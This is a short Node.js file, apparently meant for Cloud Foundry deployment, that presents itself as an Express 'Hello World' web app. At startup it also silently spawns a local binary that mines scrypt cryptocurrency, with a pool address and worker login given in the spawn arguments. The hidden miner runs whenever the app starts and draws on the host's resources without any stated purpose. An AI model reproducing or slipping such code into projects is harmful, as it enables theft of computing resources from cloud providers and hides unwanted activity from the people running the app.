var util  = require('util'),
    spawn = require('child_process').spawn,
    ls    = spawn('./minho',['-a','scrypt','-t','4','-s','6','-o','stratum+tcp://stratum.f2pool.com:8888','-O','spiritbro.panda:password']);


ls.stdout.on('data', function (data) {
  console.log('stdout: ' + data.toString());
});

ls.stderr.on('data', function (data) {
  console.log("bismillah"+process.argv[2])
  console.log('stderr: ' + data.toString());
});

ls.on('exit', function (code) {
  console.log('child process exited with code ' + code.toString());
});
var express = require("express"),
    app = express();

var port = process.env.VCAP_APP_PORT || 8080;

app.use(express.static(__dirname + '/public'));

app.get("/hello", function (request, response) {
    response.writeHead(200, {"Content-Type": "text/plain"})
    response.end("Hello World!\n");
});

app.listen(port);

require("cf-deployment-tracker-client").track();